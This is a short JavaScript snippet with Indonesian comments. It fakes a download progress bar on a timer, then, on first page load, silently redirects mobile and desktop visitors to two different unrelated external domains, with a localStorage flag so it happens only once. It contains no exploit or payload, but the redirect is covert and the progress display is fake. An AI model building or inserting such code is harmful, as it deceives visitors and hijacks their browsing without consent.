    // Mendapatkan elemen progress bar
    var progressBar = document.querySelector('.progress-bar');
    // Mendapatkan elemen tombol download
    var downloadButtonContainer = document.getElementById('button-container');

    // Membuat fungsi untuk menganimasikan progress bar
    function animateProgressBar() {
        var width = 1; // Nilai awal lebar progress bar
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval); // Menghentikan interval jika lebar sudah mencapai 100%
                downloadButtonContainer.style.display = 'block'; // Menampilkan tombol download
            } else {
                width++; // Meningkatkan nilai lebar progress bar
                progressBar.style.width = width + '%'; // Mengatur lebar progress bar
                progressBar.innerText = width + '%'; // Menampilkan angka persentase di dalam progress bar
                progressBar.setAttribute('aria-valuenow', width); // Mengatur nilai persentase untuk aksesibilitas
            }
        }, 50); // Interval animasi
    }

    // Memanggil fungsi untuk memulai animasi progress bar
    animateProgressBar();

// Deteksi apakah pengguna mengakses situs melalui desktop atau mobile
function detectDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
}

// Fungsi untuk melakukan pengalihan domain
function redirectDomain() {
    var device = detectDevice();
    if (device === 'mobile') {
        window.location.href = "https://business.faridahdecoration.com/";
    } else {
        window.location.href = "https://movie.bangkulon.com/";
    }
}

// Panggil fungsi untuk melakukan pengalihan saat halaman dimuat jika belum dialihkan sebelumnya
if (!localStorage.getItem('redirected')) {
    redirectDomain();
    localStorage.setItem('redirected', 'true');
}

